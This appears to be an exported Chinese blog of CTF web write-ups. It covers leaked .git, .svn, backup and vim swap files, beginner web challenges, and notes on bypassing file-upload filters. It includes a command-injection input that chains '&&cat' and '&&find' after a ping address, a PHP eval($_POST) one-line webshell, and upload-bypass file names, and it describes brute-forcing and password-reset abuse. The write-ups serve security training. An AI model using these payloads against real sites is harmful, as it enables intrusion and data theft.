<h2 id="2-1-F12查看源代码得到源代码"><a href="#2-1-F12查看源代码得到源代码" class="headerlink" title="2.1 F12查看源代码得到源代码"></a>2.1 F12查看源代码得到源代码</h2><h2 id="2-3-burpsuite抓包得到flag"><a href="#2-3-burpsuite抓包得到flag" class="headerlink" title="2.3 burpsuite抓包得到flag"></a>2.3 burpsuite抓包得到flag</h2><h2 id="2-4-访问url-网址-robots-txt"><a href="#2-4-访问url-网址-robots-txt" class="headerlink" title="2.4 访问url(网址)/robots.txt"></a><strong>2.4</strong> 访问url(网址)/robots.txt</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>然后访问url/flagishere.txt：</p>
<p> <img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>总结：先访问robots.txt，、查看源代码后得知再访问flagishere.txt，即可得到flag。</p>
<h2 id="2-5-访问url-index-phps-下载备份文件"><a href="#2-5-访问url-index-phps-下载备份文件" class="headerlink" title="2.5 访问url/index.phps,下载备份文件"></a>2.5 访问url/index.phps,下载备份文件</h2><p>用文本格式打开，找到flag：</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>下载后用记事本打开即可得到flag：</p>
<p>   <img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>总结：访问url/index.phps,下载备份文件后打开即可得到flag。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-6-访问url-www-zip："><a href="#2-6-访问url-www-zip：" class="headerlink" title="2.6 访问url/www.zip："></a>2.6 访问url/<a href="http://www.zip：">www.zip：</a></h2><p>接着访问url/fl000g。txt，即可得到flag</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>总结：先访问url/<a href="http://www.zip,打开压缩包后访问fl000.txt,即可得到flag./">www.zip，打开压缩包后访问fl000.txt，即可得到flag。</a></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-7考察git代码泄露"><a href="#2-7考察git代码泄露" class="headerlink" title="2.7考察git代码泄露"></a>2.7考察git代码泄露</h2><p>直接访问url/.git/index.php</p>
<p><img src="image-20211105122221977.png" alt="image-20211105122221977"></p>
<p>git源码泄露漏洞总结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_36869808/article/details/88909961</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1.git文件夹分析</p>
<p>2.git文件夹利用原理</p>
<p>3.diggit脚本简单分析</p>
<p>4.githack脚本简单分析</p>
<p>5.git源码泄露扫描</p>
<p>6.git源码泄露实例</p>
</blockquote>
<h2 id="2-8考察信息svn泄露"><a href="#2-8考察信息svn泄露" class="headerlink" title="2.8考察信息svn泄露"></a>2.8考察信息svn泄露</h2><p>直接访问url/.svn/</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>SVN（subversion）是源代码版本管理软件。<a href="https://www.cnblogs.com/batsing/p/svn-bug.html">https://www.cnblogs.com/batsing/p/svn-bug.html</a></p>
<h2 id="2-9考察vim缓存信息泄露"><a href="#2-9考察vim缓存信息泄露" class="headerlink" title="2.9考察vim缓存信息泄露"></a>2.9考察vim缓存信息泄露</h2><p>直接访问url/index.php.swp</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDFDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>打开下载文件后，直接出现flag。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>这是信息泄露的一些笔记：<a href="https://blog.csdn.net/a597934448/article/details/105431367">https://blog.csdn.net/a597934448/article/details/105431367</a></p>
<h2 id="2-10参考cookie，直接抓包"><a href="#2-10参考cookie，直接抓包" class="headerlink" title="2.10参考cookie，直接抓包"></a>2.10参考cookie，直接抓包</h2><p>在请求数据包看到flag,注{ }通过了url编码</p>
<p>根据提示“cookie 只是一块饼干，不能存放任何隐私数据”，看到cookie，直接抓包</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-11域名隐藏信息"><a href="#2-11域名隐藏信息" class="headerlink" title="2.11域名隐藏信息"></a>2.11域名隐藏信息</h2><p>根据提示“域名其实也可以隐藏信息，比如ctfshow.com 就隐藏了一条信息”<br> 通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-12网站信息查看"><a href="#2-12网站信息查看" class="headerlink" title="2.12网站信息查看"></a>2.12网站信息查看</h2><p>有时候网站上的公开信息，就是管理员常用密码</p>
<p>查看robots.txt文件，紧接着再访问admin登录，用户名admin。密码：在页面的最下方</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>密码就在页面下方</p>
<h2 id="2-13技术文档敏感信息"><a href="#2-13技术文档敏感信息" class="headerlink" title="2.13技术文档敏感信息"></a>2.13技术文档敏感信息</h2><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p>
<p>根据题目提示 技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>登录即可得到flag，但是网站打不开登录</p>
<h2 id="2-14泄露重要-editor-的信息"><a href="#2-14泄露重要-editor-的信息" class="headerlink" title="2.14泄露重要(editor)的信息"></a>2.14泄露重要(editor)的信息</h2><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p>
<p>根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>url后面添加/editor ，再寻找上传文件的按钮，看到var再进一步搜索，最后再url后面加上nothinghere/fl000g.txt</p>
<h2 id="2-15公开信息泄露"><a href="#2-15公开信息泄露" class="headerlink" title="2.15公开信息泄露"></a>2.15公开信息泄露</h2><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">题目提示：访问/admin页面 发现有一个忘记密码操作，需要输入地址 在主页面下面看到QQ邮箱，通过QQ号查询邮箱，是西安的 修改密码成功，用户名 admin 登录成功获得flag</span><br></pre></td></tr></table></figure>

<p>首先需要admin访问，然后选择忘记密码，而密保城市是西安，输入之后直接修改密码，重新登录就可以查看flag。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-16考察PHP探针"><a href="#2-16考察PHP探针" class="headerlink" title="2.16考察PHP探针"></a>2.16考察PHP探针</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。</span><br></pre></td></tr></table></figure>



<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p>
<p><strong>解题过程：url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</strong></p>
<h2 id="2-17查找到ctfer-com的真实IP"><a href="#2-17查找到ctfer-com的真实IP" class="headerlink" title="2.17查找到ctfer.com的真实IP"></a>2.17查找到ctfer.com的真实IP</h2><p>透过重重缓存，查找到ctfer.com的真实IP，提交</p>
<p>直接ping <a href="http://www.ctfshow.com/">www.ctfshow.com</a> 获得flag</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDGDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-18查看js文件，查看flag的条件"><a href="#2-18查看js文件，查看flag的条件" class="headerlink" title="2.18查看js文件，查看flag的条件"></a>2.18查看js文件，查看flag的条件</h2><p>首先查看源代码，接着进入js查看文件</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>利用谐音访问110.php</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-19密钥前端位置盗取"><a href="#2-19密钥前端位置盗取" class="headerlink" title="2.19密钥前端位置盗取"></a>2.19密钥前端位置盗取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密钥什么的，就不要放在前端了</span><br></pre></td></tr></table></figure>

<p>端查看源代码，post提交用户名密码</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="2-20mdb文件"><a href="#2-20mdb文件" class="headerlink" title="2.20mdb文件"></a>2.20mdb文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mdb文件是早期asp+access构架的数据库文件</span><br><span class="line"></span><br><span class="line"> 直接查看url路径添加/db/db.mdb</span><br><span class="line"></span><br><span class="line">下载后直接打开，搜索得到flag</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界</title>
    <url>/p/6f63874a.html</url>
    <content><![CDATA[<h1 id="爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳"><a href="#爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳" class="headerlink" title="爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳"></a>爆破🐱‍👓🐱‍🚀🐱‍💻🐱‍👤🤳</h1><h1 id="攻防世界🐱‍👓"><a href="#攻防世界🐱‍👓" class="headerlink" title="攻防世界🐱‍👓"></a>攻防世界🐱‍👓</h1><h2 id="MiscOne-this-is-flag"><a href="#MiscOne-this-is-flag" class="headerlink" title="MiscOne:this is flag"></a>MiscOne:this is flag</h2><p>直接在题目中出现了flag，此题教你如何输入答案</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="WebTwo-view-source"><a href="#WebTwo-view-source" class="headerlink" title="WebTwo:view_source"></a>WebTwo:view_source</h2><p>由于右键不可用，而这道题需要查看源代码，有以下几种方法可以查看</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDFCPMNLMMGKMCOHAGOGH" alt="图片.png">查看网页源代码的方式有4种，分别是：</p>
<p>1、鼠标右击会看到”查看源代码“，这个网页的源代码就出现在你眼前了；</p>
<p>2、可以使用快捷Ctrl+U来查看源码；</p>
<p>3、在地址栏前面加上view-source，如view-source</p>
<p>4、浏览器的设置菜单框中，找到“更多工具”，然后再找开发者工具，也可以查看网页源代码</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="Three：robots"><a href="#Three：robots" class="headerlink" title="Three：robots"></a>Three：robots</h2><p>本题考察的是robots协议，解题过程是先查找robots.txt，根据其中的路径进一步查找</p>
<p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。我们可以查看robots.txt文件，看看里面有什么内容（源自网络）</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="Four：backup"><a href="#Four：backup" class="headerlink" title="Four：backup"></a>Four：backup</h2><p>常见的备份文件后缀名为.bak</p>
<p>直接在网站后加上index.php.bak下载其中的文件再打开就可以查看到flag。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="Five-cookie"><a href="#Five-cookie" class="headerlink" title="Five:cookie"></a>Five:cookie</h2><p>Cookie是保存在客户端的纯文本文件。比如txt文件。所谓的客户端就是我们自己的本地电脑。当我们使用自己的电脑通过浏览器进行访问网页的时候，服务器就会生成一个证书并返回给我的浏览器并写入我们的本地电脑。这个证书就是cookie。一般来说cookie都是服务器端写入客户端的纯文本文件。</p>
<p>本题用brup抓包查看cookie</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDHDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>题目提示cookie，那就访问cookie.php试试看，就算没想到这个，也可以试试按F12在“网络”或者“存储”模块看看有没有cookie相关信息，恰巧两个都有cookie.php,试着访问一下，发现让你See the http response（看看http响应头）（出自网站）</p>
<h2 id="Six：disabled-button"><a href="#Six：disabled-button" class="headerlink" title="Six：disabled_button"></a>Six：disabled_button</h2><p>看到需要修改页面马上想到F12在查看器修改对应的东西，题目提示很明显，找跟disabled想关的东西就行，这个主要涉及到了前端的一些知识，在网页这边就可以修改。然后直接删除这个disable的东西再按一下flag就马上出来了。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>disabled 属性规定应该禁用 input 元素。被禁用的 input 元素既不可用，也不可点击。可以设置 disabled 属性，直到满足某些其他的条件为止（比如选择了一个复选框等等）。然后，就需要通过 JavaScript 来删除 disabled 值，将 input 元素的值切换为可用。</p>
<h2 id="Seven：weak-auth"><a href="#Seven：weak-auth" class="headerlink" title="Seven：weak_auth"></a>Seven：weak_auth</h2><p>审查元素，发现submit的页面是check.php，直接访问，提示需要字典，burp爆破即可</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="Eight：weak-auth"><a href="#Eight：weak-auth" class="headerlink" title="Eight：weak auth"></a>Eight：weak auth</h2><p>使用爆破装置，但是爆破过程麻烦。道题是个弱密码题，随便尝试登录，会告诉你用admin来登录</p>
<p>首先你需要用burt抓包，然后需要一个密码本</p>
<p>爆破后根据密码长度不同帅选密码。</p>
<h2 id="Nine-simpe-php"><a href="#Nine-simpe-php" class="headerlink" title="Nine:simpe php"></a>Nine:simpe php</h2><p>这里考察的是简单的代码理解</p>
<p>通过get方法得到a和b的值</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串。</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>   我们已经获得一部分flag了，接下来就是整flag2，首先b不能是整数或数字字符串，就是不能都是数字，最后还需要值大于1234，那么我们可以构造个12345a，值大于1234，并且不是纯数字（这里构造方式很多样，你甚至都可以b=12345[]）于是我的payload构造为?a==0&amp;b=12345a。</p>
<h2 id="Ten-get-post"><a href="#Ten-get-post" class="headerlink" title="Ten:get-post"></a>Ten:get-post</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>直接按照要求一步步进行就可以完成得出flag，直接放入url也可以；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">了解http请求方法，此处考察get和post两个最常用的请求方法。</span><br><span class="line"></span><br><span class="line">HTTP协议中共定义了八种方法或者叫“动作”来表明对Request-URI指定的资源的不同操作方式，具体介绍如下：</span><br><span class="line"></span><br><span class="line">GET：向特定的资源发出请求。</span><br><span class="line"></span><br><span class="line">POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的创建和/或已有资源的修改。</span><br><span class="line"></span><br><span class="line">OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送<span class="string">&#x27;*&#x27;</span>的请求来测试服务器的功能性。</span><br><span class="line"></span><br><span class="line">HEAD：向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。</span><br><span class="line"></span><br><span class="line">PUT：向指定资源位置上传其最新内容。</span><br><span class="line"></span><br><span class="line">DELETE：请求服务器删除Request-URI所标识的资源。</span><br><span class="line"></span><br><span class="line">TRACE：回显服务器收到的请求，主要用于测试或诊断。</span><br><span class="line"></span><br><span class="line">CONNECT：HTTP/<span class="number">1.1</span>协议中预留给能够将连接改为管道方式的代理服务器。</span><br></pre></td></tr></table></figure>



<h2 id="Eleven：xxf-referer"><a href="#Eleven：xxf-referer" class="headerlink" title="Eleven：xxf-referer"></a>Eleven：xxf-referer</h2><p>卷吕</p>
<p>   xff:是X-Forwarded-For的简写，用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br>    referer:是告诉服务器我是从哪个地方来的</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>首先就是对于ip地址的一个要求，这里我们用bo抓包来修改IP地址，为了方便，我们抓包后发送到repeter来进行。<br>考虑到修改IP地址，所以我们需要在响应头中添加 <code>X-Forwarded-For: 123.123.123.123</code>（常用修改ip地址的方法），这里有一个点需要注意一下，就是这条语句不能放在最下面一行，也不知道是不是我的bp的问题，如果放在最下面就访问总是失败（文章说的）。</p>
<p>在响应包中看到了这么一句js语句，结合题目要求，所以我们构造referer内容：<code>Referer:https://www.google.com</code></p>
<h2 id="Twelve：webshell"><a href="#Twelve：webshell" class="headerlink" title="Twelve：webshell"></a>Twelve：webshell</h2><p>此题使用蚁剑，上传一句话木马就好，题目也提醒了，百度了php一句话，并且把它放在index.php</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>打开后直接就能看到flag的文件。</p>
<p>也可以运用hackbar进行解题</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>源自网络，本人测试不成功。</p>
<h2 id="Thirteen：command-execution"><a href="#Thirteen：command-execution" class="headerlink" title="Thirteen：command-execution"></a>Thirteen：command-execution</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDBDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>本题解题过程就是先尝试一下这个ping 的东西，随便弄个网址，再试一下拼接，接下来就要尝试找flag的相关名字，找到一堆后再找其文件名。</p>
<p>1.先ping<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>2.拼接一下其他东西，是可以ping通的，那么我们就来尝试命令拼接执行的方法了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;ls</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>3.127.0.0.1 &amp;&amp;find / -name “flag*”命令拼接是可以执行的，同时也确定了这是一台linux服务器，，所以开始我们本次的目标，获得flag，，所以我们全局搜索flag，命令如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span> &amp;&amp;find / -name <span class="string">&quot;flag*&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>4.虽然出来很多，但是我们可以明显感觉到flag.txt里就是我们的答案，所以我们cat查看一下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>&amp;&amp;cat /home/flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDCDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="Fourteen：simple-js"><a href="#Fourteen：simple-js" class="headerlink" title="Fourteen：simple_js"></a>Fourteen：simple_js</h2><p>此题先需要随便输入一个密码但是发现怎么都是错的，但是题目提醒js，查看源码发现一堆代码，很容易想到要解析代码，这一段代码需要将它转换成10进制，再转换成ascle表</p>
<p>此题的解码来源于网站<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/p/592e5fba.html</url>
    <content><![CDATA[<h1 id="文件上传漏洞🥘"><a href="#文件上传漏洞🥘" class="headerlink" title="文件上传漏洞🥘"></a>文件上传漏洞🥘</h1><h2 id="漏洞原理👮‍♂️"><a href="#漏洞原理👮‍♂️" class="headerlink" title="漏洞原理👮‍♂️"></a>漏洞原理👮‍♂️</h2><p>通过 PHP，可以把文件上传到服务器。</p>
<p>在一个网站上，都会有上传文件的功能，比如上传头像图片什么的，这时候文件上传的地方就存在着可能被我们绕过的地方。当我们找到可以绕过的地方，然后将恶意代码植入到服务器中，再通过url去访问以执行代码，那么我们就有可能拿到目标服务器的web权限。</p>
<h3 id="产生原因概括"><a href="#产生原因概括" class="headerlink" title="产生原因概括"></a>产生原因概括</h3><p>类似于php，asp，jsp或者其他语言编写的网站，在修改或者一个新的页面后能够立即生效，所以如果一个web程序存在有文件上传处并且对上传的文件内容或者是后缀过滤的不够严格就有可能产生文件上传漏洞。</p>
<p>大致会有以下几种原因：</p>
<ul>
<li>开源编辑器的上传漏洞</li>
<li>服务器配置不当</li>
<li>本地文件上传限制被绕过</li>
<li>过滤不严或被绕过</li>
<li>文件解析漏洞导致文件执行</li>
<li>文件路径截断</li>
</ul>
<h2 id="以下几种不同的绕过方式："><a href="#以下几种不同的绕过方式：" class="headerlink" title="以下几种不同的绕过方式："></a>以下几种不同的绕过方式：</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><h4 id="1-寻找没有过滤的类型："><a href="#1-寻找没有过滤的类型：" class="headerlink" title="1.寻找没有过滤的类型："></a>1.寻找没有过滤的类型：</h4><p><strong>phtml</strong> <strong>php3</strong> <strong>php4</strong> <strong>php5</strong> <strong>PHP</strong> <strong>phtm</strong></p>
<p>例如<code>phtml php3 php4 php5 PHP phtm</code>这些后缀名首先得让服务器支持这些解析为php脚本运行，<strong>httpd.conf</strong>配置文件中可以查看设置。</p>
<p>首先了解一下apache，它是一款web服务器软件，我们php或者其他语言编写的web程序通常不能直接运行在服务器上，需要借助web服务器软件完成对我们指定语言的解析才能运行，那么apache对于php的解析规则是可以被利用的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache的解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不可识别，就继续往左判断。直到遇到可以解析的文件后缀为止</span><br></pre></td></tr></table></figure>

<p>这是一个apache老版本的解析漏洞，也就是说我们可以上传一个如abc.php.asu，那么asu在我们配置中不存在，apache无法解析它，就会去解析php，而后端代码只是检查了asu，此时我们就能够绕过他来上传文件。</p>
<p>还有一点特性是因为配置文件中使用了正则表达式去匹配了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.+.ph(p[345]?|t|tml)</span><br><span class="line">.+\.phps$</span><br></pre></td></tr></table></figure>

<p>在不同版本有不同的漏洞，这里直接看下图：</p>
<p><img src="https://cdn.redmango.top/img/32c98214577198af2e54266c9de3d39.png"></p>
<p>遇到了apache服务器的话又实在想不到解决办法可以一个一个尝试上传。</p>
<p>比如如果黑名单并没有过滤phtm，就可以上传phtm的木马</p>
<h4 id="2-大小写绕过"><a href="#2-大小写绕过" class="headerlink" title="2.大小写绕过"></a>2.大小写绕过</h4><p>例如<strong>phP</strong>,黑名单上不存在的话就可以绕过，过滤严格的话一般会用个**strtolower()**把后缀全变为小写，那个时候就不行了。</p>
<h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><p><strong>1、空字节注入</strong></p>
<p>shell.php%00.png</p>
<p><strong>2、双写扩展名</strong></p>
<p>shell.jpg.php</p>
<p>白名单就是限制我们只能上传什么，通常来说这类很难绕过，但我们可以配合其他漏洞来绕过这个漏洞。</p>
<p>回顾文件包含漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>

<p>php中使用include我们可以包含一个非php的文件，并且会把其内的字符串作为php代码来执行，因此我们发现此类漏洞时可以直接上传一个包含php代码的图片或者txt文件来执行我们的php代码。</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>假如对上传文件的内容中的php，POST，eval替换为空，那么我们可以用这样的方式绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?pphphp</span><br><span class="line">@eevalval($_PPOSTOST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<h3 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h3><ul>
<li>PHP5中还支持其他标识符</li>
<li>JS风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;phpinfo();&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>短标签风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>&lt;?=?&gt;</code>与<code>&lt;?php echo ....?&gt;</code>等效</li>
<li>ASP风格</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;% phpinfo();%&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>官方默认风格</li>
</ul>
